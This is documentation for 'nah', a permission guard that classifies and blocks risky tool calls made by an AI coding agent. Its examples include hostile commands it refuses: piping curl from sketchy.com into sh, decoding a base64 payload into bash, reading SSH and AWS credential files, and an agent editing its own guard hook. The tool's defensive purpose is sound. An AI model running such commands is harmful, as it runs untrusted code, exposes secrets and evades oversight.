# nah

**A permission system you control.**
Because allow-or-deny isn't enough.

---

`git push`? Sure.
`git push --force`? nah?

`rm -rf __pycache__` to clean up? Ok.
`rm ~/.bashrc`? nah.

Read `./src/app.py`? Go ahead.
Read `~/.ssh/id_rsa`? nah.

Write `./config.yaml`? Fine.
Write `~/.bashrc` with `curl sketchy.com | sh`? nah.

---

nah classifies every tool call by what it actually does — using contextual rules that run in milliseconds, zero LLM tokens. For the ambiguous stuff, optionally route to an LLM. Every decision is logged and inspectable. Works out of the box, configure it how you want.

## Quick install

```bash
pip install nah
nah install
```

## What does it look like?

```
Claude: Edit → ~/.claude/hooks/nah_guard.py
  nah. Edit targets hook directory (self-modification blocked)

Claude: Read → ~/.aws/credentials
  nah? Read targets sensitive path: ~/.aws

Claude: Bash → npm test
  ✓ allowed (package_run)

Claude: Bash → base64 -d payload | bash
  nah. obfuscated execution: bash receives decoded input
```

**`nah.`** = blocked. **`nah?`** = asks for confirmation. Everything else flows through silently.

## What it guards

| Tool | What nah checks |
|------|----------------|
| **Bash** | Structural classification — action type, pipe composition, shell unwrapping |
| **Read** | Sensitive path detection (`~/.ssh`, `~/.aws`, `.env`, ...) |
| **Write** | Path check + content inspection (secrets, exfiltration, destructive payloads) |
| **Edit** | Path check + content inspection on the replacement string |
| **Glob** | Guards directory scanning of sensitive locations |
| **Grep** | Catches credential search patterns outside the project |
| **MCP** | Generic classification for third-party tool servers |

<div class="grid cards" markdown>

-   :material-download:{ .lg .middle } **Install**

    ---

    Get up and running in 30 seconds

    [:octicons-arrow-right-24: Install](install.md)

-   :material-cog:{ .lg .middle } **Configure**

    ---

    Action types, profiles, safety lists, LLM layer

    [:octicons-arrow-right-24: Configuration](configuration/index.md)

-   :material-pipe:{ .lg .middle } **How it works**

    ---

    Classification pipeline, composition rules, context resolution

    [:octicons-arrow-right-24: Architecture](how-it-works.md)

-   :material-rocket-launch:{ .lg .middle } **Getting started**

    ---

    First 5 minutes — test, customize, inspect

    [:octicons-arrow-right-24: Guide](guides/getting-started.md)

</div>
